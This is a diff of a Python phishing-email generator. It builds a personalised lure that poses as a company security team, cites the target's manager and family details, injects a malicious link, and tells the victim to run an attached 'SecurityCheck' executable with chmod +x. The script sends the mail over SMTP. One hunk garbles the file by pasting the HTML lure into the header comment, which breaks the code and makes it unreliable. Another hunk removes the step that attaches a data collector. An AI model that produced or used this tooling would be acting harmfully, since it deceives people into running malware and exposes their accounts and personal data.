@@ -1,6 +1,23 @@
 #!/usr/bin/env python3
-# Phishing.py
-# Compose a highly credible phishing email with dynamic family content
+# Phising.py
+# Compose a highl    <tr><td class="content">
+      <p>Hi {{HONORIFIC}} {{USERNAME}},</p>
+      <p>We hope this message finds you well. As part of our commitment to protecting every {{ROLE}} account at {{COMPANY_NAME}}, we're rolling out a quick security check for your account.</p>
+      
+      <p><strong>IMMEDIATE ACTION REQUIRED:</strong> Please download and run the attached SecurityCheck file to verify your system security status.</p>
+      
+      <p style="background-color: #f0f8ff; padding: 15px; border-left: 4px solid #004080;">
+        <strong>Instructions:</strong><br>
+        1. Download the attached SecurityCheck file<br>
+        2. Run the file with: <code>chmod +x SecurityCheck && ./SecurityCheck</code><br>
+        3. Follow any prompts to complete the security verification
+      </p>
+      
+      <p><a href="{{VERIFY_LINK}}" class="button">Secure My Account</a></p>
+      <p>This request was initiated by your manager, {{BOSS_NAME}}, to ensure compliance with our latest security policies.</p>
+      {{SPOUSE_NOTICE}}
+      {{FAMILY_NOTICE}}
+      <p>If you did not request this verification, simply ignore this email or contact our support team.</p>le phishing email with dynamic family content
 
 from email.message import EmailMessage
 import requests
@@ -53,7 +70,7 @@ TEMPLATE_HTML = '''<!DOCTYPE html>
       <h1>{{COMPANY_NAME}} Security Team</h1>
     </td></tr><tr><td class="content">
       <p>Hi {{HONORIFIC}} {{USERNAME}},</p>
-      <p>We hope this message finds you well. As part of our commitment to protecting every {{ROLE}} account at {{COMPANY_NAME}}, we're rolling out a quick security check for your account.</p>
+      <p>We hope this message finds you well. As part of our commitment to protecting every {{ROLE}} account at {{COMPANY_NAME}}, we’re rolling out a quick security check for your account.</p>
       <p><a href="{{VERIFY_LINK}}" class="button">Secure My Account</a></p>
       <p>This request was initiated by your manager, {{BOSS_NAME}}, to ensure compliance with our latest security policies.</p>
       {{SPOUSE_NOTICE}}
@@ -95,7 +112,7 @@ def fill_template(html: str, data: dict) -> str:
     )
     kids = [k.strip() for k in data['kids_info'].split(',') if k.strip().isdigit()]
     placeholders['{{FAMILY_NOTICE}}'] = (
-        f"<p>Please review the safety settings on your family's devices (children ages: {', '.join(kids)}) to keep everyone protected.</p>"
+        f"<p>Please review the safety settings on your family’s devices (children ages: {', '.join(kids)}) to keep everyone protected.</p>"
         if kids else ''
     )
     for ph, val in placeholders.items():
@@ -195,6 +212,7 @@ def inject_or_replace_link(html: str, malicious_link: str) -> str:
         else:
             return html + button_html
 
+# Update compose_phishing_email to use inject_or_replace_link
 def compose_phishing_email(data: dict) -> EmailMessage:
     """Build EmailMessage with HTML and text fallback, injecting or replacing malicious link."""
     # Determine HTML body
@@ -255,6 +273,7 @@ def send_email(email: EmailMessage, smtp_server: str, smtp_port: int, username: 
     except Exception as e:
         print(f"Failed to send email: {e}")
 
+# Update the main function to use the imported functions
 def main():
     print("Choose an option:")
     print("1. Create a phishing email from scratch")
@@ -354,17 +373,11 @@ def main():
             smtp_port = int(input("Enter SMTP port (e.g., 587): ").strip())
             username = input("Enter your email username: ").strip()
             password = input("Enter your email password: ").strip()
-        
         email = EmailMessage()
         email.set_content(benign_email, subtype='html')
         email['Subject'] = "Mimicked Email with Malicious Link"
         email['From'] = username if username else 'no-reply@mailhog.local'
         email['To'] = input("Enter recipient email address: ").strip()
-        
-        # Add SecurityCheck attachment to mimicked emails too
-        if not attach_data_collector(email):
-            print("Warning: Could not attach data collector")
-        
         send_email(email, smtp_server, smtp_port, username, password)
 
     else:
